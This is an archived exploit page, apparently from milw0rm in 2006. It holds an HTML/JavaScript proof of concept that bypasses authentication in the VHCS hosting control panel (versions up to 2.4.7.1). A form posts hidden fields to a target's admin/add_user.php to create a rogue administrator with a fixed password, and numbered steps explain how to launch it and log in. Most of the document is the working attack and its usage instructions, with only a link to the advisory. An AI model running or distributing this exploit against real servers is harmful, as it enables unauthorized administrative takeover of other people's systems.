<html><head><title>VHCS <= 2.4.7.1 (Add User) Authentication Bypass Exploit</title></head><pre>&lt;html&gt;

&lt;head&gt;
&lt;title&gt;VHCS (version &lt;= 2.4.7.1) PoC. &amp;nbsp;By RoMaNSoFt&lt;/title&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
function submitform()
{
  if (document.admin_add_user.username.value=='admin')
  {
    alert('Learn to read before launching an exploit, script-kiddie!');
    exit();
  }
  
  document.admin_add_user.action=document.admin_add_user.target.value;
  document.admin_add_user.submit();
}
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
  &lt;hr&gt;
  &lt;center&gt;
  	&lt;b&gt;VHCS (version &lt;= 2.4.7.1) PoC. &amp;nbsp;By RoMaNSoFt &amp;#60roman&amp;#64rs-labs.com&amp;#62 &amp;nbsp;[08.Feb.2006]&lt;/b&gt;

  &lt;/center&gt;
  &lt;hr&gt;
  
	&lt;form name=&quot;admin_add_user&quot; method=&quot;post&quot; action=&quot;&quot;&gt;
            &lt;table width=&quot;100%&quot; cellpadding=&quot;5&quot; cellspacing=&quot;5&quot;&gt;
              &lt;tr&gt;
                &lt;td width=&quot;20&quot;&gt;&amp;nbsp;&lt;/td&gt;
                &lt;td colspan=&quot;2&quot;&gt;
                  &amp;nbsp;
                &lt;/td&gt;

              &lt;/tr&gt;
              &lt;tr&gt;
                &lt;td width=&quot;20&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td width=&quot;200&quot;&gt;Target URL&lt;/td&gt;
                &lt;td&gt; 
                  &lt;input type=&quot;text&quot; name=&quot;target&quot; value=&quot;http://&lt;target&gt;/vhcs2/admin/add_user.php&quot; style=&quot;width:400px&quot;&gt;
                &lt;/td&gt;
              &lt;/tr&gt;
              
              &lt;tr&gt;

                &lt;td width=&quot;20&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td width=&quot;200&quot;&gt;Username&lt;/td&gt;
                &lt;td&gt; 
                  &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot; style=&quot;width:200px&quot;&gt;&amp;nbsp;(should NOT exist)
                &lt;/td&gt;
              &lt;/tr&gt;
              &lt;tr&gt; 
                &lt;td&gt;&amp;nbsp;&lt;/td&gt;
                &lt;td colspan=&quot;2&quot;&gt;&lt;a href=&quot;javascript: submitform()&quot;&gt;Exploit it!&lt;/a&gt;&lt;/td&gt;              
              &lt;/tr&gt;

              &lt;tr&gt; 
                &lt;td colspan=&quot;3&quot;&gt;&amp;nbsp; 
                  &lt;/td&gt;
              &lt;/tr&gt;
            &lt;/table&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;pass&quot; value=&quot;dsrrocks&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;pass_rep&quot; value=&quot;dsrrocks&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vhcs-exploit@rs-labs.com&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;uaction&quot; value=&quot;add_user&quot;&gt;
        &lt;/form&gt;

        
        &lt;hr&gt;
        &lt;br&gt;
        &lt;u&gt;Quick instructions&lt;/u&gt;.-&lt;br&gt;
        &lt;br&gt;
        1.- Enable JavaScript. Fill in the form with appropiate target URL (usually you will only need to replace &amp;#60target&amp;#62 string) and username.&lt;br&gt;
        2.- Remember not to use a probably existing username (such as &quot;admin&quot;).&lt;br&gt;

        3.- Launch the exploit. &lt;i&gt;If target system is vulnerable, a new VHCS admin user will be created&lt;/i&gt; ;-)&lt;br&gt;
        4.- You will be redirected to VHCS login page. Try to login with your brand new username.&lt;br&gt;
        5.- Ummm, I forgot it... The password is: &lt;b&gt;dsrrocks&lt;/b&gt;.&lt;br&gt;

        &lt;br&gt;

        &lt;u&gt;More info (analysis, fix, etc)&lt;/u&gt;.-&lt;br&gt;
        &lt;br&gt;
        See &lt;a href=http://www.rs-labs.com/adv/RS-Labs-Advisory-2006-1.txt&gt;&lt;i&gt;RS-2006-1&lt;/i&gt;&lt;/a&gt;.&lt;br&gt;
				&lt;br&gt;
				&lt;hr&gt;
&lt;/body&gt;

&lt;/html&gt;

# milw0rm.com [2006-02-23]</pre></html>